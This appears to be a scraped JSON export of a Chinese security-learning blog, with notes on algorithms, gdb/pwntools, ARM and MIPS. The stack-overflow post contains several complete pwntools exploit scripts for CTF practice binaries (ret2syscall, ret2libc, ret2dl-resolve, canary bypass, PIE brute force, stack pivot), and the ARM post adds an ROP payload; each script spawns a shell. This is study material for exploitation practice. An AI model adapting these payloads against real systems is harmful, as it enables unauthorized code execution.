alls.push_back(l); alls.push_back(r); &#125; sort(alls.begin(), alls.end()); alls.erase(unique(alls), alls.end()); for(auto item : add) &#123; int x = find(item.first); a[x] += item.second; &#125; for(int i = 1; i &lt;= alls.size(); i ++ ) s[i] = s[i - 1] + a[i]; for(auto item : query) &#123; int l = find(item.first), r = find(item.second); cout &lt;&lt; s[r] - s[l - 1] &lt;&lt; endl; &#125; return 0;&#125; 区间合并1）把要合并的区间按区间左端点从小到大排序2）用st和ed指针从前往后维护区间3）比较ed 和后一个区间的左端点，分情况更新ed和first 1234567891011121314151617181920// 将所有存在交集的区间合并void merge(vector&lt;PII&gt; &amp;segs)&#123; vector&lt;PII&gt; res; sort(segs.begin(), segs.end()); int st = -2e9, ed = -2e9; for (auto seg : segs) //定义了一个自动类型变量seg, seg的取值从segs[0]开始到segs末尾，也就是遍历了segs if (ed &lt; seg.first) &#123; if (st != -2e9) res.push_back(&#123;st, ed&#125;); st = seg.first, ed = seg.second; &#125; else ed = max(ed, seg.second); if (st != -2e9) res.push_back(&#123;st, ed&#125;); segs = res;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://example.com/tags/%E7%AE%97%E6%B3%95/"}],"keywords":[{"name":"算法","slug":"算法","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95/"}]},{"title":"pwndbg/pwntools","slug":"pwn入门","date":"2022-07-05T16:00:00.000Z","updated":"2022-07-06T07:57:03.183Z","comments":true,"path":"2022/07/06/pwn入门/","link":"","permalink":"http://example.com/2022/07/06/pwn%E5%85%A5%E9%97%A8/","excerpt":"","text":"pwndbg&#x2F;gdb的使用X的使用x 是 examine 的缩写 n 表示要显示的内存单元的个数 u 表示一个地址单元的长度： b 表示单字节h 表示双字节w 表示四字节g 表示八字节f 表示显示方式，可取如下值： x 按十六进制格式显示变量d 按十进制格式显示变量u 按十进制格式显示无符号整型o 按八进制格式显示变量t 按二进制格式显示变量a 按十六进制格式显示变量i 指令地址格式c 按字符格式显示变量f 按浮点数格式显示变量举例x &#x2F;20gx buf: 表示从内存地址 buf 读取内容，g 表示八字节，20 表示 20 个单位，x 按十六进制格式显示变量 x &#x2F;3hu buf：表示从内存地址 buf 读取内容，h 表示以双字节为一个单位，3 表示三个单位，u 表示十进制格式显示无符号整型 P的使用打印指令p(print)：p fun_name &#x2F;&#x2F;打印fun_name的地址，需要保留符号p 0x10-0x08 &#x2F;&#x2F;计算0x10-0x08的结果p &amp;a &#x2F;&#x2F;查看变量a的地址p *(0x123456) &#x2F;&#x2F;查看0x123456地址的值，注意和x指令的区别，x指令查看地址的值不用星号p $rdi &#x2F;&#x2F;显示rdi寄存器的值，注意和x的区别，这只是显示rdi的值，而不是rdi指向的值p *($rdi) &#x2F;&#x2F;显示rdi指向的值 cycliccyclic n ：生成长度为n的字符串 cyclic -l aaaa #查找偏移（一般是返回地址 假如说我想找aaaj这个字符串的偏移，我们可以用 1cyclic_find(&#x27;aaaj&#x27;) 其他info all-registers 查看所有的寄存器的值 pwntools的使用p32 p64就是将一个数字转换为字符，例如 1p32(0xdeadbeef) 就会转换为 1&#x27;\\xef\\xbe\\xad\\xde&#x27; 这里顺序反了是因为linux编译的程序是小端序的 u32 u64就是将字符转换为数字，","categories":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/categories/pwn/"}],"tags":[{"name":"入门","slug":"入门","permalink":"http://example.com/tags/%E5%85%A5%E9%97%A8/"}],"keywords":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/categories/pwn/"}]},{"title":"栈溢出","slug":"栈溢出","date":"2022-07-05T16:00:00.000Z","updated":"2022-07-14T08:31:00.199Z","comments":true,"path":"2022/07/06/栈溢出/","link":"","permalink":"http://example.com/2022/07/06/%E6%A0%88%E6%BA%A2%E5%87%BA/","excerpt":"","text":"ret2syscallLinux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数 应用程序调用系统调用的过程是： 1、把系统调用的编号存入 EAX 2、把函数参数存入其它通用寄存器 3、触发 0x80 号中断（int 0x80） 在32位下： 1.将EAX寄存器的值设置为OXb:EAX &#x3D; OXb 3.将ECX和EDX寄存器的值都设为O: ECX &#x3D; EDx &#x3D; 0 3.将ECX和EDX寄存器的值都设为O: ECX &#x3D; EDx &#x3D; o 64位下： 1.将RAX寄存器的值设置为0×3b:RAX &#x3D; OX3b 2.将RDI寄存器的值设置为”&#x2F;bin&#x2F;sh”字符串的地址:RDI &#x3D; &amp;(“ &#x2F;bin&#x2F;sh”) 3.将RSI和RDX寄存器的值都设为0: RSI &#x3D; RDX &#x3D; o 只需要让栈顶的值 然后可以通过 pop eax 达到目的 例（CTFwiki）： 计算偏移 运用ropper 查找int 0x80系统调用 1ropper -f ret2syscall --search &quot;int 0x80&quot; 运用ropper 查找其他寄存器 1ropper -f ret2syscall --search &quot;pop|ret&quot;| grep &#x27;eax&#x27; 其他类推 在IDA找到bin&#x2F;sh的地址 exp: 123456789101112131415161718192021222324from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]p = process(&quot;./ret2syscall&quot;)if args.G: gdb.attach(p)pop_eax_ret = 0x080bb196pop_ebx_ret = 0x080481c9pop_ecx_ebx_ret = 0x0806eb91pop_edx_ecx_ebx_ret = 0x0806eb90pop_edx_ret = 0x0806eb6aint_0x80 = 0x08049421bin_sh_addr = 0x80be408p.recvuntil(&quot;What do you plan to do?\\n&quot;)payload = b&quot;a&quot;*112 + p32(pop_eax_ret) payload += p32(0xb) + p32(pop_edx_ecx_ebx_ret) payload += p32(0) + p32(0) + p32(bin_sh_addr) payload += p32(int_0x80)p.sendline(payload)p.interactive() ret2libc 例1：在ida找到bin&#x2F;sh字符串地址 查找到system函数存在地址 123456from pwn import *p = process(&quot;./ret2libc1&quot;)p.recvuntil(&quot;RET2LIBC &gt;_&lt;\\n&quot;)payload = b&quot;a&quot;*112 + p32(0x8048460) + b&quot;xxxx&quot; + p32(0x8048720)p.sendline(payload)p.interactive() 例2没有system函数。也没有binsh字符串 system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下 https://github.com/niklasb/libc-database 所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。 那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。 此外，在得到 libc 之后，其实 libc 中也是有 &#x2F;bin&#x2F;sh 字符串的，所以我们可以一起获得 &#x2F;bin&#x2F;sh 字符串的地址。 基本利用思路如下 泄露 puts函数 地址 获取 libc 版本 获取 system 地址与 &#x2F;bin&#x2F;sh 的地址 再次执行源程序 触发栈溢出执行 system(‘&#x2F;bin&#x2F;sh’) 单步运行过puts函数，查询got表 通过vmmap找到对应libc的基地址，并且计算偏移 再计算system函数的偏移 然后searh “bin&#x2F;sh”的地址，再计算bin&#x2F;sh1的偏移 123456789101112131415161718192021222324252627282930313233from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]p = process(&quot;./ret2libc2&quot;)if args.G: gdb.attach(p)gets_plt = 0x8048440puts_plt = 0x8048460main_addr = 0x8048618puts_got = 0x804a018p.recvuntil(&quot;Can you find it !?&quot;)payload = b&quot;a&quot;*112 + p32(puts_plt) + p32(main_addr) + p32(puts_got)p.sendline(payload)puts_addr = u32(p.recv(4))libc_addr = puts_addr - 0x6dc30system_addr = libc_addr + 0x41790bin_sh_addr = libc_addr + 0x18e363success(&quot;puts_addr: &quot; + hex(puts_addr))success(&quot;system_addr: &quot; + hex(system_addr))success(&quot;bin_sh_addr: &quot; + hex(bin_sh_addr))p.recvuntil(&quot;Can you find it !?&quot;)payload1 = b&quot;a&quot;*104 + p32(system_addr) + b&quot;xxxx&quot; + p32(bin_sh_addr)#payload1 = b&quot;a&quot;*104 + p32(gets_plt) + p32(system_addr) + p32(0x804a020) + p32(0x804a020)p.sendline(payload1)&#x27;&#x27;&#x27;sleep(0.2)p.sendline(&quot;/bin/sh\\x00&quot;)&#x27;&#x27;&#x27;p.interactive() ret2dl ELF关于动态链接的关键segment： .dynamic:一般保存了ELF文件依赖于哪些动态库,动态符号节信息; 各segment的位置关系: .dynamic的地址加Ox44的位置是. dynstr;.dynamic的地址加Ox4c的位置是. dynsym;.dynamic的地址加Ox84的位置是.rel.plt; 第一次调用一个函数时_dl_runtime_resolve函数的工作: _dl_runtime resolve(link map_obj, reloc index)： 1.首先用link_map访问.dynamic，分别取出.dynstr、.dynsym、.rel.plt的地址; 2..rel.plt ＋参数reloc_index,求出当前函数的重定位表项Elf32_Rel的指针，记作rel; 3.rel-&gt;r_info &gt; &gt;8&#x3D; n作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym;4..dynstr + sym-&gt;st_name得出符号名字符串指针; 5.在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表; 6.最后调用这个函数; 例题： 思路: exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27; ,&#x27;-c&#x27;]name = &#x27;./pwn&#x27;p = process(name)#p=remote(&#x27;chall.pwnable.tw&#x27;, 10103)elf= ELF(name)#libc = ELF(&#x27;./libc_32.so.6&#x27;)if args.G: gdb.attach(p) rel_plt_addr = elf.get_section_by_name(&#x27;.rel.plt&#x27;).header.sh_addr #0x8048330dynsym_addr = elf.get_section_by_name(&#x27;.dynsym&#x27;).header.sh_addr #0x80481d8dynstr_addr = elf.get_section_by_name(&#x27;.dynstr&#x27;).header.sh_addr #0x8048278resolve_plt = 0x08048380leave_ret_addr = 0x0804851d start = 0x804aa00fake_rel_plt_addr = startfake_dynsym_addr = fake_rel_plt_addr + 0x8fake_dynstr_addr = fake_dynsym_addr + 0x10bin_sh_addr = fake_dynstr_addr + 0x7n = fake_rel_plt_addr - rel_plt_addrr_info = (int((fake_dynsym_addr - dynsym_addr)/0x10) &lt;&lt; 8) + 0x7str_offset = fake_dynstr_addr - dynstr_addrfake_rel_plt = p32(elf.got[&#x27;read&#x27;]) + p32(r_info)fake_dynsym = p32(str_offset) + p32(0) + p32(0) + p32(0x12000000)fake_dynstr = b&quot;system\\x00/bin/sh\\x00\\x00&quot;pay1 = b&#x27;a&#x27;*108 + p32(start - 20) + p32(elf.plt[&#x27;read&#x27;]) + p32(leave_ret_addr) + p32(0) + p32(start - 20) + p32(0x100)p.recvuntil(&#x27;Welcome to RET_TO_DL~!\\n&#x27;)#p.recvuntil(&quot;Nice to meet you~!\\n&quot;)p.sendline(pay1)sleep(1)pay2 = p32(0x0) + p32(resolve_plt) + p32(n) + b&#x27;aaaa&#x27; + p32(bin_sh_addr) + fake_rel_plt + fake_dynsym + fake_dynstrp.sendline(pay2)success(&quot;.rel_plt: &quot; + hex(rel_plt_addr))success(&quot;.dynsym: &quot; + hex(dynsym_addr))success(&quot;.dynstr: &quot; + hex(dynstr_addr))success(&quot;fake_rel_plt_addr: &quot; + hex(fake_rel_plt_addr))success(&quot;fake_dynsym_addr: &quot; + hex(fake_dynsym_addr))success(&quot;fake_dynstr_addr: &quot; + hex(fake_dynstr_addr))success(&quot;n: &quot; + hex(n))success(&quot;r_info: &quot; + hex(r_info))success(&quot;offset: &quot; + hex(str_offset))success(&quot;system_addr: &quot; + hex(fake_dynstr_addr))success(&quot;bss_addr: &quot; + hex(elf.bss()))p.interactive() 击败cancary基本原理函数开始执行的时候会先往栈底插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法(栈帧销毁前测试该值是否被改 变)，如果不合法就停止程序运行(发生了栈溢出); 在Linux当中我们将这段cookie信息称为Canary ,Canary是一个低字节为\\x00的16进制数; 因为Canary在局部变量的后边,在EBP或RBP的前面所以当攻击者覆盖返回地址的时候往往也会将cookie信息给覆盖掉,这就会导致栈保护检查失败而阻止payload的执行,从而避免漏洞利用成功. 绕过方法方法一:泄露栈中的Canary: Canary设计为以字节×O0O结尾,其本意就是为了保证Canary 可以截断字符串,防止我们输出字符串的时候将Canary打印出来;所以泄露栈中的Canary的思路是将Canary的低字节\\x00覆盖，然后连同用户的字符串一起打印出剩余的Canary部分; 当我们打印出完整的Canary后,在溢出的时候再将正确Canary填回去,就可以进行控制返回地址,控制程序流程了. 条件: 1.有合适的输出函数 2.泄露Canary后程序不会崩溃 例题： exp： 12345678910111213141516171819202122232425from pwn import *#context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]name = &#x27;./pwn1&#x27;p = process(name)elf = ELF(name)if args.G: gdb.attach(p)p.recvuntil(&quot;Welcome!\\n&quot;)payload = &quot;a&quot;*28 + &quot;b&quot;*4p.sendline(payload)p.recvuntil(&quot;bbbb&quot;)canary = u32(p.recv(4)) - 0xasuccess(&quot;canary: &quot; + hex(canary))getshell_addr = 0x804858bpayload1 = b&quot;a&quot;*32 + p32(canary) + b&quot;b&quot;*12 + p32(getshell_addr)p.sendline(payload1)p.interactive() 方法二:爆破Canary: 对于Canary,虽然每次进程重启后的Canary 不同(相比GS，GS重启后是相同的)但是同一个进程中的不同线程的Canary 是相同的,并且通过fork函数创建的子进程的Canary也是相同的,因为fork函数会直接拷贝父进程的内存。 我们可以利用这样的特点，彻底逐个字节将Canary爆破出来. 缺点:多进程程序,32位程序需要爆破3字节,64位程序需要爆破7字节,需要爆破较多. 其他方法: 1.联合其他漏洞修改劫持_stack_chk_fail函数; 例题： 1234567891011121314151617181920212223242526from pwn import *name = &#x27;./pwn2&#x27;p = process(name)elf = ELF(name)p.recvuntil(&#x27;welcome\\n&#x27;)canary = &#x27;\\x00&#x27;for i in range(3): print(hex(i)) for j in range(256): print(hex(j)) p.send(&#x27;a&#x27;*100 + canary + chr(j)) a = p.recvuntil(&quot;welcome\\n&quot;) if b&quot;recv&quot; in a: canary += chr(j) breakcanary = u32(canary)success(&quot;canary: &quot; + hex(canary))getflag = 0x0804863Bpayload = b&#x27;a&#x27;*100 + p32(canary) + b&#x27;a&#x27;*12 + p32(getflag)p.sendline(payload)p.interactive() PIE绕过：position-independent executable,地址无关可执行文件,该技术就是一个针对代码段.text,数据段.*data，.bss等固定地址的一个防护技术应用了PIE的程序会在每次加载时都变换加载基址，从而使ropper等工具无法得到准确的地址. 方法一: Partial Write部分写入技术,由于内存的页载入机制，PIE的随机化只能影响到单个内存页;通常来说,一个内存页大小为Ox1000,这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的就是利用了PIE后12位地址不变的特点,通过覆盖EIP的后8或16位(按字节写入每字节8位)就可以快速爆破或者直接劫持EIP; 特点: 1.程序不大,有后门函数等;2.只需要爆破一个字节 例题 1234567891011121314151617181920212223242526272829from pwn import *i = 0while True: i += 1 print (i) if(i &gt; 0xff): print(&quot;Wrong!&quot;) break io = process(&quot;./partial_write&quot;) io.recv() payload = &#x27;a&#x27;*40 payload += &#x27;\\xca&#x27; #strncpy复制202个字节造成溢出 io.sendline(payload) io.recv() payload = &#x27;a&#x27;*200 payload += &#x27;\\x01\\x39&#x27; #frontdoor的地址后三位是0x900, +1跳过push rbp 爆破的是3 io.sendline(payload) io.recv() try: io.recv(timeout = 1) except EOFError: io.close() continue else: sleep(0.1) io.sendline(&#x27;/bin/sh\\x00&#x27;) sleep(0.1) io.interactive() #没有EOFError的话就是爆破成功，可以开shell break 方法二:直接泄露地址因为PIE影响的只是程序加载基址，并不会影响指令间的相对地址,如果我们可以泄露出一个程序或ibc的某些地址，我们就可以利用地址减去偏移地址得到基地址,从而算出其他函数的地址,这种方法也是我们最常用的方法.通过泄露地址来计算libc基地址的时候需要注意的是libc版本不同,对应的偏移也不同. 例题： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]name = &#x27;./pwn1&#x27;p = process(name)elf = ELF(name)if args.G: gdb.attach(p)p.recvuntil(&quot;Tell me your name:\\n&quot;)payload = &quot;a&quot;*8p.send(payload)p.recvuntil(&quot;a&quot;*8)pro_addr = u64(p.recv(6) + b&quot;\\x00\\x00&quot;) - 0x82dputs_got_addr = pro_addr + elf.got[&#x27;puts&#x27;]puts_plt_addr = pro_addr + elf.plt[&#x27;puts&#x27;]main_addr = pro_addr + elf.symbols[&#x27;main&#x27;]success(&quot;pro_addr: &quot; + hex(pro_addr))success(&quot;puts_got_addr: &quot; + hex(puts_got_addr))success(&quot;puts_plt_addr: &quot; + hex(puts_plt_addr))success(&quot;main_addr: &quot; + hex(main_addr))p.recvuntil(&quot;What do you want to say?\\n&quot;)pop_rdi_addr = pro_addr + 0x843payload1 = b&quot;a&quot;*184 payload1 += p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr)payload1 += p64(main_addr)p.sendline(payload1)p.recvuntil(&quot;Bye!\\n&quot;)libc_addr = u64(p.recv(6) + b&quot;\\x00\\x00&quot;) - 0x68f90system_addr = libc_addr + 0x3f480bin_sh_addr = libc_addr + 0x1619d9success(&quot;libc_addr: &quot; + hex(libc_addr))success(&quot;system_addr: &quot; + hex(system_addr))success(&quot;bin_sh_addr: &quot; + hex(bin_sh_addr))p.recvuntil(&quot;Tell me your name:\\n&quot;)p.sendline(&quot;aaa&quot;)p.recvuntil(&quot;What do you want to say?\\n&quot;)payload2 = b&quot;c&quot;*184 payload2 += p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr) p.sendline(payload2)p.interactive() 整数溢出：类型一:未限制范围这种情况主要是变量有固定大小的字节,但是却允许我们输入无限多的数据,和gets()函数产生的栈溢出很相似 类型二:错误的类型转换正确的对变量进行了约束但是在类型转换上面出错了,范围大的变量赋值给范围小的变量 例题： 程序为dest分配了0x14字节的储存空间，而第二个read函数可以读取0x199个字节，这个地方存在栈溢出 12345678910111213from pwn import *p = process(&quot;./int_over&quot;)payload = b&quot;a&quot;*24 + p32(0x804868b)payload += b&quot;b&quot;*(0x104 - len(payload))p.recvuntil(&quot;Your choice:&quot;)p.sendline(&quot;1&quot;)p.recvuntil(&quot;Please input your username:\\n&quot;)p.sendline(&quot;sir&quot;)p.recvuntil(&quot;Please input your passwd:\\n&quot;)p.sendline(payload)p.interactive 栈迁移：劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行ROP等操作;通俗的讲其实就是将ESP或RSP指针修改为我们可以控制的内存区地址比如bss段堆等位置,然后在可控内存区当中布置payload等; 条件: 1.程序存在溢出;2.可以控制sp指针; 用途: 1.栈益出可以溢出的空间大小不足 因为我们的主要思想是修改sp指针,所以我们需要通过一些汇编指令来修改sp指针,常用汇编指令:; 1.pop esp;2.pop ecx; lea esp,[ecx-Ox4];3.leave; ret; —&gt; mov esp, ebp; pop ebp; ret; 需要注意的地方: 1.迁移过去的内存一定要可读可写; ⒉.迁移过去的内存要注意离不可读不可写的内存要远一些,因为调用一些函数的时候需要较大的栈空间; 3.我们构造的栈空间和程序的栈空间有相同的性质,即push,pop等操作对sp,bp指针的操作一样; 例题： 1234567891011121314151617181920212223242526272829from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]p = process(&quot;./test1&quot;)if args.G: gdb.attach(p)bin_sh_addr = 0x80495d0system_plt = 0x8048370read_plt = 0x8048340leave_ret = 0x80484d5pop3_ret = 0x080485a9gadgets = 0x8048549bss = 0x804a560payload = p32(read_plt) + p32(pop3_ret) + p32(0) + p32(bss) + p32(100) payload += p32(gadgets) + p32(bss + 4)p.recvuntil(&quot;Hello,tell me your story:\\n&quot;)p.sendline(payload)payload1 = b&quot;b&quot;*10 + p32(0x804a060 + 4)p.recvuntil(&quot;By the way, what&#x27;s your name:\\n&quot;)p.sendline(payload1)sleep(1)payload2 = p32(system_plt) + b&quot;aaaa&quot; + p32(bin_sh_addr) p.sendline(payload2)p.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/categories/pwn/"}],"tags":[{"name":"栈溢出","slug":"栈溢出","permalink":"http://example.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"}],"keywords":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/categories/pwn/"}]},{"title":"armpwn入门","slug":"armpwn入门","date":"2022-07-04T16:00:00.000Z","updated":"2022-07-05T13:57:05.731Z","comments":true,"path":"2022/07/05/armpwn入门/","link":"","permalink":"http://example.com/2022/07/05/armpwn%E5%85%A5%E9%97%A8/","excerpt":"","text":"调试 常用命令info functions ：显示程序的使用的函数 disassemble 函数名 ：反汇编指定函数 查看内存命令x&#x2F;&lt;n&#x2F;f&#x2F;u&gt; n是一个正整数，表示显示内存的长度f 表示显示的格式 u表示从当前地址往后请求的字节数(u参数可以用下面的字符来代替b表示单字节，h表示双字节，w表示四字节，g表示八字节) 编译arm架构程序并用qemu执行1234#编译arm-linux-gnueabihf-gcc -g hello.c -o eastgets#qemu执行 动态链接程序，需要指定libc的位置qemu-arm -L /usr/arm-linux-gnueabihf/ ./eastgets typo(例题) 32位arm小端，静态编译，没有符号表 恢复符号表对于静态编译的 bianry， 可以使用 lscan, flirt, rizzo, bindiff 等多种方法恢复部分符号表 https://www.freebuf.com/articles/terminal/134980.html arm架构的libc在 &#x2F;usr&#x2F;arm-linux-gnueabihf&#x2F;lib里面 尝试恢复符号表： （1）下载对应libc.so sudo apt install libc6-armhf-cross cp &#x2F;usr&#x2F;arm-linux-gnueabihf&#x2F;lib&#x2F;libc-2.23.so .&#x2F; （2）下载rizzo插件 使用rizzo插件： https://github.com/fireundubh/IDA7-Rizzo 放入：C:\\Program Files\\IDA 7.0\\plugins （3）用IDA打开libc-2.23.so 导出libc.23.so.riz: File-&gt;Produce file-&gt;Rizzo signature file （4）打开目标程序 加载.riz: File-&gt;Load file-&gt;Rizzo signature file 溢出函数 arm架构下32bit程序，函数的前四个参数分别保存在r0~r3寄存器中，其余的参数在栈中，函数返回值 保存在寄存器r0中。 找到0x20904，将“&#x2F;bin&#x2F;sh”地址赋给r0，并将system的地址赋给pc，就可以执行system(“&#x2F;bin&#x2F;sh”) 12345678from pwn import *payload = &quot;A&quot;*112 + p32(0x20904) + p32(0x6c384)*2 + p32(0x110b4)p = process(&quot;./typo&quot;)p.recvuntil(&quot;quit&quot;)p.send(&quot;\\n&quot;)p.recvuntil(&quot;----&quot;)p.sendline(payload)p.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/categories/pwn/"}],"tags":[{"name":"arm","slug":"arm","permalink":"http://example.com/tags/arm/"}],"keywords":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/categories/pwn/"}]},{"title":"mips基础","slug":"Mips基础","date":"2022-07-02T16:00:00.000Z","updated":"2022-07-28T12:46:00.837Z","comments":true,"path":"2022/07/03/Mips基础/","link":"","permalink":"http://example.com/2022/07/03/Mips%E5%9F%BA%E7%A1%80/","excerpt":"","text":"基本特点 寄存器 流水线操作 寻址方式 指令格式 指令集基础运算 逻辑运算 移位运算 访存 跳转 CPU控制指令 其他指令 MIPS 汇编 | FreeFlyingSheep 的小站","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[{"name":"mips","slug":"mips","permalink":"http://example.com/tags/mips/"}],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"arm基础","slug":"arm基础","date":"2022-06-30T16:00:00.000Z","updated":"2022-07-01T13:39:44.089Z","comments":true,"path":"2022/07/01/arm基础/","link":"","permalink":"http://example.com/2022/07/01/arm%E5%9F%BA%E7%A1%80/","excerpt":"","text":"arm工作模式ARM之所以设计出这么多种模式出来，就是为了「应对CPU在运行时各种突发事件」，比如要支持正常的应用程序的运行，在运行任何一个时间点又可能发生很多异常事件，比如：关机、收到网卡信息、除数为0、访问非法内存、解析到了非法指令等等，不光要能处理这些异常还要能够从异常中再返回到原来的程序继续执行。 两种工作状态1、ARM状态：32位，ARM状态执行字对齐的32位ARM指令。 2、Thumb状态，16位，执行半字对齐的16位指令。 注：1、ARM和Thumb两种状态之间的切换不影响处理器的工作模式和寄存器的内容。 ​ 2、ARM处理器在处理异常时，不管处理器处于什么状态，则都将切换到ARM状态。 寄存器 通用寄存器包括R0~R15,可以分为3类: 未分组寄存器R0~R7 分组寄存器R8~R14、R13(SP) 、R14(LR) 程序计数器PC(R15)、R8_fiq-R12_fir为快中断独有 1. 未分组寄存器R0~R7在所有运行模式下,未分组寄存器都指向同一个物理寄存器,它们未被系统用作特殊的用途.因此在中断或异常处理进行运行模式转换时,由于不同的处理器运行模式均使用相同的物理寄存器,所以可能造成寄存器中数据的破坏。 2. 分组寄存器R8~R14对于分组寄存器,它们每一次所访问的物理寄存器都与当前处理器的运行模式有关。 对于R8R12来说,每个寄存器对应2个不同的物理寄存器,当使用FIQ(快速中断模式)时,访问寄存器 R8_fiqR12_fiq;当使用除FIQ模式以外的其他模式时,访问寄存器R8_usr~R12_usr。 对于R13,R14来说,每个寄存器对应7个不同的物理寄存器,其中一个是用户模式与系统模式共用,另外6个物理寄存器对应其他6种不同的运行模式,并采用以下记号来区分不同的物理寄存器: 1R13_mode R14_mode 其中mode可为:「usr,fiq,irq,svc,abt,und，mon」。 3. 寄存器R13（sp）在ARM指令中常用作「堆栈指针」,用户也可使用其他的寄存器作为堆栈指针,而在Thumb指令集中,某些指令强制性的要求使用R13作为堆栈指针。 寄存器R13在ARM指令中常用作堆栈指针，但这只是一种习惯用法，用户也可使用其他的寄存器作为堆栈指针。而在Thumb指令集中，某些指令强制性的要求使用R13作为堆栈指针。 由于处理器的每种运行模式均有自己独立的物理寄存器R13，在用户应用程序的初始化部分，一般都要初始化每种模式下的R13，使其指向该运行模式的栈空间。这样，当程序的运行进入异常模式时，可以将需要保护的寄存器放入R13所指向的堆栈，而当程序从异常模式返回时，则从对应的堆栈中恢复，采用这种方式可以保证异常发生后程序的正常执行。 4. R14（LR）链接寄存器(Link Register)当执行子程序调用指令(BL)时,R14可得到R15(程序计数器PC)的备份。 在每一种运行模式下，都可用R14保存子程序的返回地址，当用BL或BLX指令调用子程序时，将PC的当前值复制给R14，执行完子程序后，又将R14的值复制回PC，即可完成子程序的调用返回。以上的描述可用指令完成。 从子程序返回：「方法1：」 123 MOV PC, LR或者 BX LR 「方法2：」 在子程序入口处使用以下指令将R14存入堆栈： 1STMFD SP！,&#123;,LR&#125; 对应的，使用以下指令可以完成子程序返回： 1LDMFD SP！,&#123;,PC&#125; 5. R15(PC)程序状态寄存器寄存器R15用作程序计数器(PC),在ARM状态下,位[1:0]为0,位[31:2]用于保存PC,在Thumb状态下,位[0]为0,位[31:1]用于保存PC。 比如如果pc的值是0x40008001,那么在寻址的时候其实会查找地址0x40008000，低2位会自动忽略掉。「个中原因，请读者自己思考?」 由于ARM体系结构采用了多级流水线技术，对于ARM指令集而言，PC总是指向当前指令的下两条指令的地址,即PC的值为当前指令的地址值加8个字节。 1即：PC值=当前程序执行位置+8 6. CPSR、SPSR「CPSR」(Current Program Status Register，当前程序状态寄存器)，CPSR可在任何运行模式下被访问，它包括条件标志位、中断禁止位、当前处理器模式标志位，以及其他一些相关的控制和状态位。 每一种运行模式下又都有一个专用的物理状态寄存器，称为「SPSR」(Saved Program Status Register，备份的程序状态寄存器)，当异常发生时，SPSR用于保存CPSR的当前值，从异常退出时则可由SPSR来恢复CPSR。 由于用户模式和系统模式不属于异常模式，它们没有SPSR，当在这两种模式下访问SPSR，结果是未知的。 寄存器CPSR格式如下： 条件码标志(condition code flags) 「N,Z,C,V」均为条件码标志位,它们的内容可被算术或逻辑运算的结果所改变,并且可以决定某条指令是否被执行。 在ARM状态下,绝大多数的指令都是有条件执行的,在Thumb状态下,仅有分支指令是有条件执行的。 「N (Number)」: 当用两个补码表示的带符号数进行运算时,N&#x3D;1表示运行结果为负,N&#x3D;0表示运行结果为正或零 「Z :(Zero)」: Z&#x3D;1表示运算结果为零,Z&#x3D;0表示运行结果非零 「C」 : 可以有4种方法设置C的值： (Come)加法运算(包括CMP):当运算结果产生了进位时C&#x3D;1,否则C&#x3D;0 减法运算(包括CMP):当运算产生了借位,C&#x3D;0否则C&#x3D;1 对于包含移位操作的非加&#x2F;减运算指令 ,C为移出值的最后一位 对于其他的非加&#x2F;减运算指令C的值通常不改变 「V」 :(oVerflow)对于加&#x2F;减法运算指令,当操作数和运算结果为二进制的补码表示的带符号位溢出时,V&#x3D;1表示符号位溢出;对于其他的非加&#x2F;减运算指令V的值通常不改变 「Q」： 在ARM V5及以上版本的E系列处理器中，用Q标志位指示增强的DSP运算指令是否发生了溢出。在其它版本的处理器中，Q标志位无定义 「J：」仅ARM v5TE-J架构支持 , T&#x3D;0;J &#x3D; 1 处理器处于Jazelle状态,也可以和其他位组合. 「E位：」 大小端控制位 「A位：」 A&#x3D;1 禁止不精确的数据异常 「T :」 T &#x3D; 0;J&#x3D;0; 处理器处于 ARM 状态 T 